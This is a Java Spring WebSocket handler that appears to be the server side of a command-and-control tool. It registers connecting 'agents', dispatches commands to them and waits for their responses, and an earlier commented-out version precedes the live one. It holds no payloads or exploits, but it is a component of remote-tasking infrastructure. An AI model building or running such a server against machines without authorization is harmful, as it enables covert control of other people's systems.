/*package com.c2.config;

import com.c2.protocol.ProtocolMessage;
import org.springframework.stereotype.Component;
import org.springframework.web.socket.*;
import org.springframework.web.socket.handler.TextWebSocketHandler;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;
import org.springframework.web.socket.WebSocketSession;
import org.springframework.web.socket.TextMessage;
import java.util.UUID;
import java.util.concurrent.ConcurrentHashMap;

@Component
public class C2WebSocketHandler extends TextWebSocketHandler {
    private final Map<String, WebSocketSession> sessions = new ConcurrentHashMap<>();
    private final ConcurrentHashMap<String, WebSocketSession> clients = new ConcurrentHashMap<>();
    private final ConcurrentHashMap<WebSocketSession, String> reverse = new ConcurrentHashMap<>();

    @Override
    public void afterConnectionEstablished(WebSocketSession session) {
        String clientId = session.getId(); // or custom ID
        sessions.put(clientId, session);

        System.out.println("[+] Client connected: " + clientId);
    }

    @Override
    protected void handleTextMessage(WebSocketSession session, TextMessage message) {
        String id = reverse.get(session);

        try {
            ProtocolMessage msg = ProtocolMessage.fromJson(message.getPayload());

            if (ProtocolMessage.TYPE_RESPONSE.equals(msg.type())) {
                System.out.println("Response from " + id + ": " + msg.data());
            }

        } catch (Exception e) {
            System.out.println("Invalid JSON from " + id);
        }
    }

    @Override
    public void afterConnectionClosed(WebSocketSession session, CloseStatus status) {
        String id = reverse.remove(session);
        if (id != null) {
            clients.remove(id);
            System.out.println("[-] " + id + " disconnected");
        }
    }
    public ConcurrentHashMap<String, WebSocketSession> getClients() {
        return clients;
    }
    public void sendCommand(String clientId, String command) {
        WebSocketSession session = clients.get(clientId);

        if (session != null && session.isOpen()) {
            try {
                ProtocolMessage msg = ProtocolMessage.command(
                        "server",
                        clientId,
                        command
                );

                session.sendMessage(new TextMessage(msg.toJson()));

            } catch (Exception e) {
                System.out.println("Failed to send command: " + e.getMessage());
            }
        } else {
            System.out.println("Client not connected: " + clientId);
        }
    }
}*/
package com.c2.config;

import com.c2.protocol.ProtocolMessage;
import org.springframework.stereotype.Component;
import org.springframework.web.socket.*;
import org.springframework.web.socket.handler.TextWebSocketHandler;

import java.util.UUID;
import java.util.concurrent.CompletableFuture;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.TimeoutException;

@Component
public class C2WebSocketHandler extends TextWebSocketHandler {

    private final ConcurrentHashMap<String, WebSocketSession> clients = new ConcurrentHashMap<>();
    private final ConcurrentHashMap<WebSocketSession, String> reverse = new ConcurrentHashMap<>();
    private final ConcurrentHashMap<String, CompletableFuture<String>> pendingCommands = new ConcurrentHashMap<>();

    @Override
    public void afterConnectionEstablished(WebSocketSession session) {
        String id = "Agent-" + UUID.randomUUID().toString().substring(0,5);

        clients.put(id, session);
        reverse.put(session, id);

        System.out.println("[+] " + id + " connected");
    }

    @Override
    protected void handleTextMessage(WebSocketSession session, TextMessage message) {
        String id = reverse.get(session);

        try {
            ProtocolMessage msg = ProtocolMessage.fromJson(message.getPayload());

            if (ProtocolMessage.TYPE_RESPONSE.equals(msg.type())) {
                System.out.println("Response from " + id + ": " + msg.data());
                CompletableFuture<String> future = pendingCommands.remove(msg.id());
                if (future != null) {
                    future.complete(msg.data());
                }
            }

        } catch (Exception e) {
            System.out.println("Invalid JSON from " + id);
        }
    }

    @Override
    public void afterConnectionClosed(WebSocketSession session, CloseStatus status) {
        String id = reverse.remove(session);
        if (id != null) {
            clients.remove(id);
            System.out.println("[-] " + id + " disconnected");
        }
    }

    public ConcurrentHashMap<String, WebSocketSession> getClients() {
        return clients;
    }

    public String sendCommand(String agentId, String command) {
        WebSocketSession session = clients.get(agentId);

        if (session == null || !session.isOpen()) {
            System.out.println("Agent not found");
            return "Error: Agent not connected";
        }

        String messageId = UUID.randomUUID().toString();
        CompletableFuture<String> future = new CompletableFuture<>();
        pendingCommands.put(messageId, future);

        try {
            ProtocolMessage msg = ProtocolMessage.command(
                    messageId,
                    agentId,
                    command
            );

            session.sendMessage(new TextMessage(msg.toJson()));
            
            return future.get(15, TimeUnit.SECONDS);

        } catch (TimeoutException e) {
            pendingCommands.remove(messageId);
            return "Error: Command timed out after 15 seconds.";
        } catch (Exception e) {
            pendingCommands.remove(messageId);
            e.printStackTrace();
            return "Error: " + e.getMessage();
        }
    }
}